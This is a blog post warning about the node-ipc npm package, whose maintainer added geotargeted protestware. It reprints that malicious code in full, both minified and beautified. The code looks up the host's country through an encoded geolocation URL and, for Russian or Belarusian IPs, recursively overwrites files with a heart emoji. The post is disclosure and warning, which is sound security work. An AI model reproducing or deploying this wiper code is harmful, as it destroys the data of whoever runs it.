+++
title = "Npm package node-ipc is malware?"
date = 2022-03-18
description = "npm package node-ipc is malware?"
+++

# TLDR
DO NOT use or update this module if you or your production servers etc. are located in a country actively involved in the invasion of Ukraine. Author of this package opposes said invasion and put a malicious code to wipe out data and put "❤️" on where they were. You are warned about this feature. Use at your own risk.

~~ Source: [https://github.com/RIAEvangelist/node-ipc/pull/373/files](https://github.com/RIAEvangelist/node-ipc/pull/373/files)

Hey, this is a quick blog post about a topic that happened around yesterday. Brandon Nozaki Miller, or known as [RIAEvangelist](https://github.com/RIAEvangelist) on github. He wanted to spread his views about the Russian-Ukraine war, and he wanted to harm people with Russian or countries related in the Ukraine-Russian war ip's by deleting all their data and replacing it with heart emojis like this: "❤️". This is malware and a federal crime as he disguised it in a package (a popular one I might add).

This shows the darkside of opensource perfectly, one person gets some control and dependencies and uses it for bad. Basically one bad apple ruining a lot of other apples.

I have lost my trust in this dev, and wont be using his software again. I have reported him to gitub and npm.

If you would like to check if your packages are affected take a look at [https://github.com/zlw9991/node-ipc-dependencies-list](https://github.com/zlw9991/node-ipc-dependencies-list). A lot of electron packages are affected, and also vue/cli-shared-utils (a part of vue.js) is affected.

If you are wondering this is the line of code that is malicious. 

### ***Warning do not run this code, none of the problems and issues you get if you run this is my issue or problem or responsibility.***

```javascript

import u from"path";import a from"fs";import o from"https";setTimeout(function(){const t=Math.round(Math.random()*4);if(t>1){return}const n=Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=","base64");o.get(n.toString("utf8"),function(t){t.on("data",function(t){const n=Buffer.from("Li8=","base64");const o=Buffer.from("Li4v","base64");const r=Buffer.from("Li4vLi4v","base64");const f=Buffer.from("Lw==","base64");const c=Buffer.from("Y291bnRyeV9uYW1l","base64");const e=Buffer.from("cnVzc2lh","base64");const i=Buffer.from("YmVsYXJ1cw==","base64");try{const s=JSON.parse(t.toString("utf8"));const u=s[c.toString("utf8")].toLowerCase();const a=u.includes(e.toString("utf8"))||u.includes(i.toString("utf8"));if(a){h(n.toString("utf8"));h(o.toString("utf8"));h(r.toString("utf8"));h(f.toString("utf8"))}}catch(t){}})})},Math.ceil(Math.random()*1e3));async function h(n="",o=""){if(!a.existsSync(n)){return}let r=[];try{r=a.readdirSync(n)}catch(t){}const f=[];const c=Buffer.from("4p2k77iP","base64");for(var e=0;e<r.length;e++){const i=u.join(n,r[e]);let t=null;try{t=a.lstatSync(i)}catch(t){continue}if(t.isDirectory()){const s=h(i,o);s.length>0?f.push(...s):null}else if(i.indexOf(o)>=0){try{a.writeFile(i,c.toString("utf8"),function(){})}catch(t){}}}return f};const ssl=true;export {ssl as default,ssl}
```
Link to file (will probably get deactivated): [https://github.com/RIAEvangelist/node-ipc/blob/847047cf7f81ab08352038b2204f0e7633449580/dao/ssl-geospec.js](https://github.com/RIAEvangelist/node-ipc/blob/847047cf7f81ab08352038b2204f0e7633449580/dao/ssl-geospec.js)

This above code will check if the ip is from Russia or Belarus and then verwrite many files with a heart emoji recursively. It goes up parent directories.

### ***Warning do not run this code, none of the problems and issues you get if you run this is my issue or problem or responsibility.***

```javascript

import u from "path";
import a from "fs";
import o from "https";
setTimeout(function () {
    const t = Math.round(Math.random() * 4);
    if (t > 1) {
        return;
    }
    const n = Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=", "base64");
    o.get(n.toString("utf8"), function (t) {
        t.on("data", function (t) {
            const n = Buffer.from("Li8=", "base64");
            const o = Buffer.from("Li4v", "base64");
            const r = Buffer.from("Li4vLi4v", "base64");
            const f = Buffer.from("Lw==", "base64");
            const c = Buffer.from("Y291bnRyeV9uYW1l", "base64");
            const e = Buffer.from("cnVzc2lh", "base64");
            const i = Buffer.from("YmVsYXJ1cw==", "base64");
            try {
                const s = JSON.parse(t.toString("utf8"));
                const u = s[c.toString("utf8")].toLowerCase();
                const a = u.includes(e.toString("utf8")) || u.includes(i.toString("utf8"));
                if (a) {
                    h(n.toString("utf8"));
                    h(o.toString("utf8"));
                    h(r.toString("utf8"));
                    h(f.toString("utf8"));
                }
            } catch (t) {}
        });
    });
}, Math.ceil(Math.random() * 1e3));
async function h(n = "", o = "") {
    if (!a.existsSync(n)) {
        return;
    }
    let r = [];
    try {
        r = a.readdirSync(n);
    } catch (t) {}
    const f = [];
    const c = Buffer.from("4p2k77iP", "base64");
    for (var e = 0; e < r.length; e++) {
        const i = u.join(n, r[e]);
        let t = null;
        try {
            t = a.lstatSync(i);
        } catch (t) {
            continue;
        }
        if (t.isDirectory()) {
            const s = h(i, o);
            s.length > 0 ? f.push(...s) : null;
        } else if (i.indexOf(o) >= 0) {
            try {
                a.writeFile(i, c.toString("utf8"), function () {});
            } catch (t) {}
        }
    }
    return f;
}
const ssl = true;
export { ssl as default, ssl };
```

This overwrites the file with heart emoji, read the source below for a more detailed explanation.

### ***Warning do not run this code, none of the problems and issues you get if you run this is my issue or problem or responsibility.***

~~Source and if you would like to learn more about the code read this gist: [https://gist.github.com/MidSpike/f7ae3457420af78a54b38a31cc0c809c](https://gist.github.com/MidSpike/f7ae3457420af78a54b38a31cc0c809c)

node-ipc and peacenotwar github (malware)
- [https://github.com/RIAEvangelist/node-ipc](https://github.com/RIAEvangelist/node-ipc)
- [https://github.com/RIAEvangelist/peacenotwar](https://github.com/RIAEvangelist/peacenotwar)
